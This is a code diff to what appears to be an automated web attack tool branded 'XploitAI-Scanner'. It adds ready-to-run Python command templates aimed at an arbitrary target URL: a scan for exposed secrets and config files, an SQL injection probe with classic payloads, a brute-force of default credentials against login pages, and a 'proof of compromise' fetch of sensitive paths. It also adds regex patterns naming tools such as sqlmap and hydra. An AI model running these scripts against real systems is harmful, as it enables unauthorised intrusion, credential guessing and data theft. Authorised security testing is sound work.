@@ -58,6 +58,131 @@ CANONICAL_TEMPLATES: dict[str, str] = {
         "            pass\n"
         "\""
     ),
+    "VulnerabilityScanning": (
+        "python -c \"\n"
+        "import urllib.request, urllib.error\n"
+        "base = '{target}'.rstrip('/')\n"
+        "targets = [('', 'root'), ('/.env', 'env'), ('/config.php', 'config'), ('/backup', 'backup'), ('/server-status', 'server-status'), ('/actuator', 'actuator'), ('/phpinfo.php', 'phpinfo')]\n"
+        "security_headers = ['X-Frame-Options','X-Content-Type-Options','Content-Security-Policy','Strict-Transport-Security','X-XSS-Protection']\n"
+        "for path, label in targets:\n"
+        "    url = base + path\n"
+        "    try:\n"
+        "        req = urllib.request.Request(url, headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n"
+        "        resp = urllib.request.urlopen(req, timeout=8)\n"
+        "        body = resp.read(300).decode('utf-8', 'ignore')\n"
+        "        print('CHECK [' + str(resp.status) + '] ' + label + ' ' + url)\n"
+        "        if path == '':\n"
+        "            hdrs = dict(resp.headers)\n"
+        "            for header in security_headers:\n"
+        "                if header in hdrs:\n"
+        "                    print('HEADER_PRESENT: ' + header + '=' + hdrs[header])\n"
+        "                else:\n"
+        "                    print('HEADER_MISSING: ' + header)\n"
+        "            if hdrs.get('Server'):\n"
+        "                print('SERVER_BANNER: ' + hdrs['Server'])\n"
+        "            if hdrs.get('X-Powered-By'):\n"
+        "                print('POWERED_BY: ' + hdrs['X-Powered-By'])\n"
+        "        if path and resp.status < 400:\n"
+        "            print('EXPOSED_PATH: ' + path + ' => ' + body[:120].replace('\\n', ' '))\n"
+        "        resp.close()\n"
+        "    except urllib.error.HTTPError as e:\n"
+        "        print('CHECK [' + str(e.code) + '] ' + label + ' ' + url)\n"
+        "        if path and e.code not in (403, 404, 410):\n"
+        "            print('SUSPICIOUS_PATH: ' + path + ' status=' + str(e.code))\n"
+        "    except Exception as e:\n"
+        "        print('SCAN_ERROR: ' + url + ' => ' + str(e))\n"
+        "\""
+    ),
+    "SQLInjectionProbe": (
+        "python -c \"\n"
+        "import urllib.request, urllib.error, urllib.parse\n"
+        "base = '{target}'.rstrip('/')\n"
+        "payloads = [\\\"' OR '1'='1\\\", \\\"' OR 1=1--\\\", \\\"admin'--\\\", \\\"' UNION SELECT NULL--\\\"]\n"
+        "targets = [('/login', 'POST', {'username': 'PAYLOAD', 'password': 'test'}), ('/search', 'GET', {'q': 'PAYLOAD'}), ('/api/users', 'GET', {'id': 'PAYLOAD'})]\n"
+        "signals = ['sql', 'syntax', 'mysql', 'sqlite', 'postgres', 'odbc', 'exception', 'warning']\n"
+        "for path, method, template in targets:\n"
+        "    for payload in payloads:\n"
+        "        params = {k: (payload if v == 'PAYLOAD' else v) for k, v in template.items()}\n"
+        "        try:\n"
+        "            if method == 'POST':\n"
+        "                data = urllib.parse.urlencode(params).encode()\n"
+        "                req = urllib.request.Request(base + path, data=data, headers={'User-Agent': 'XploitAI-Scanner/1.0', 'Content-Type': 'application/x-www-form-urlencoded'})\n"
+        "            else:\n"
+        "                req = urllib.request.Request(base + path + '?' + urllib.parse.urlencode(params), headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n"
+        "            resp = urllib.request.urlopen(req, timeout=8)\n"
+        "            body = resp.read(500).decode('utf-8', 'ignore')\n"
+        "            print('SQLI_CHECK [' + str(resp.status) + '] ' + path + ' payload=' + payload)\n"
+        "            if any(s in body.lower() for s in signals):\n"
+        "                print('SQLI_SIGNAL: ' + path + ' payload=' + payload + ' evidence=' + body[:160].replace('\\n', ' '))\n"
+        "            resp.close()\n"
+        "        except urllib.error.HTTPError as e:\n"
+        "            body = e.read(400).decode('utf-8', 'ignore') if hasattr(e, 'read') else ''\n"
+        "            print('SQLI_CHECK [' + str(e.code) + '] ' + path + ' payload=' + payload)\n"
+        "            if any(s in body.lower() for s in signals):\n"
+        "                print('SQLI_SIGNAL: ' + path + ' payload=' + payload + ' evidence=' + body[:160].replace('\\n', ' '))\n"
+        "        except Exception as e:\n"
+        "            print('SQLI_ERROR: ' + path + ' payload=' + payload + ' => ' + str(e))\n"
+        "\""
+    ),
+    "ExploitAttempt": (
+        "python -c \"\n"
+        "import urllib.request, urllib.error, urllib.parse\n"
+        "base = '{target}'.rstrip('/')\n"
+        "login_paths = ['/login', '/signin', '/admin/login']\n"
+        "creds = [('admin','admin'),('admin','password'),('admin','123456'),('administrator','admin'),('test','test')]\n"
+        "for login_path in login_paths:\n"
+        "    for user, pwd in creds:\n"
+        "        data = urllib.parse.urlencode({'username': user, 'password': pwd}).encode()\n"
+        "        try:\n"
+        "            req = urllib.request.Request(base + login_path, data=data, headers={'User-Agent': 'XploitAI-Scanner/1.0', 'Content-Type': 'application/x-www-form-urlencoded'})\n"
+        "            resp = urllib.request.urlopen(req, timeout=8)\n"
+        "            body = resp.read(400).decode('utf-8', 'ignore')\n"
+        "            location = resp.headers.get('Location', '')\n"
+        "            cookies = resp.headers.get_all('Set-Cookie', []) if hasattr(resp.headers, 'get_all') else []\n"
+        "            print('AUTH_CHECK [' + str(resp.status) + '] ' + login_path + ' user=' + user)\n"
+        "            if location:\n"
+        "                print('REDIRECT_TARGET: ' + location)\n"
+        "            if cookies:\n"
+        "                print('SESSION_COOKIE: ' + '; '.join(cookies[:2]))\n"
+        "            if any(x in body.lower() for x in ['logout','dashboard','welcome','profile','admin panel']) or '/dashboard' in location or '/admin' in location or cookies:\n"
+        "                print('AUTH_SUCCESS: ' + login_path + ' user=' + user + ' password=' + pwd)\n"
+        "                raise SystemExit(0)\n"
+        "            resp.close()\n"
+        "        except urllib.error.HTTPError as e:\n"
+        "            body = e.read(300).decode('utf-8', 'ignore') if hasattr(e, 'read') else ''\n"
+        "            print('AUTH_CHECK [' + str(e.code) + '] ' + login_path + ' user=' + user)\n"
+        "            if any(x in body.lower() for x in ['logout','dashboard','welcome','profile','admin panel']):\n"
+        "                print('AUTH_SUCCESS: ' + login_path + ' user=' + user + ' password=' + pwd)\n"
+        "                raise SystemExit(0)\n"
+        "        except Exception as e:\n"
+        "            print('AUTH_ERROR: ' + login_path + ' user=' + user + ' => ' + str(e))\n"
+        "print('AUTH_SUCCESS: none')\n"
+        "\""
+    ),
+    "ProofOfCompromise": (
+        "python -c \"\n"
+        "import urllib.request, urllib.error\n"
+        "base = '{target}'.rstrip('/')\n"
+        "targets = [('/.env','env file'),('/config.php','config'),('/api/users','user list'),('/api/admin','admin api'),('/backup','backup'),('/dashboard','dashboard'),('/admin','admin panel'),('/phpinfo.php','phpinfo'),('/server-status','server status')]\n"
+        "proof_count = 0\n"
+        "for path, label in targets:\n"
+        "    url = base + path\n"
+        "    try:\n"
+        "        req = urllib.request.Request(url, headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n"
+        "        resp = urllib.request.urlopen(req, timeout=8)\n"
+        "        body = resp.read(220).decode('utf-8', 'ignore').replace('\\n', ' ')\n"
+        "        print('POC_CHECK [' + str(resp.status) + '] ' + path + ' (' + label + ')')\n"
+        "        if resp.status < 400:\n"
+        "            proof_count += 1\n"
+        "            print('PROOF_FOUND: ' + path + ' => ' + body[:160])\n"
+        "        resp.close()\n"
+        "    except urllib.error.HTTPError as e:\n"
+        "        print('POC_CHECK [' + str(e.code) + '] ' + path + ' (' + label + ')')\n"
+        "    except Exception as e:\n"
+        "        print('POC_ERROR: ' + path + ' => ' + str(e))\n"
+        "print('PROOF_SUMMARY: ' + str(proof_count) + ' accessible proof targets')\n"
+        "\""
+    ),
 }
 
 PLACEHOLDERS = {
@@ -79,6 +204,10 @@ _TOOL_PATTERNS: tuple[tuple[str, str], ...] = (
     ("nmap", r"(?<![\w./-])nmap(?![\w./-])"),
     ("whatweb", r"(?<![\w./-])whatweb(?![\w./-])"),
     ("dirsearch", r"(?<![\w./-])dirsearch(?:\.py)?(?![\w./-])"),
+    ("arjun", r"(?<![\w./-])arjun(?![\w./-])"),
+    ("nikto", r"(?<![\w./-])nikto(?![\w./-])"),
+    ("sqlmap", r"(?<![\w./-])sqlmap(?![\w./-])"),
+    ("hydra", r"(?<![\w./-])hydra(?![\w./-])"),
     ("paramspider", r"(?<![\w./-])paramspider(?:\.py)?(?![\w./-])"),
 )
 
@@ -109,12 +238,11 @@ def normalize_command_template(command_obj: Command) -> str:
     Persisting the brace-escaped form causes repeated re-escaping across runs,
     which eventually produces commands containing '{{{{...}}}}'.
     """
-    template = command_obj.command_template or ""
     canonical = CANONICAL_TEMPLATES.get(command_obj.name)
-    if not template and canonical:
-        command_obj.command_template = canonical
-        command_obj.save(update_fields=["command_template"])
+    if canonical:
         return canonical
+
+    template = command_obj.command_template or ""
 
     return escape_non_placeholder_braces(template)
 
